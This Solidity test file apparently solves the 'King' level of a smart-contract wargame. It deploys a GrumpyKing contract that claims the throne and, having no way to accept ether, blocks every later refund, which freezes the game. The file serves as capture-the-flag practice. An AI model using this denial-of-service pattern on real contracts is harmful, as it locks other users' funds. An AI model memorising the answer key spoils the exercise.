// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {BaseTest} from "./BaseTest.sol";
import {KingFactory} from "../src/levels/09-KingFactory.sol";
import {King} from "../src/levels/09-King.sol";

contract GrumpyKing {
    function coronate(address payable where) public payable {
        where.call{value: msg.value}("");
    }
}

contract KingSolution is BaseTest {

    function solution(address payable target_) internal override{
        GrumpyKing grumpy = new GrumpyKing();
        King target = King(target_);
        grumpy.coronate{value: 0.001 ether}(payable(target));
    }

    function construction() internal override returns(address payable ) {
        return payable(address(new KingFactory()));
    }
}
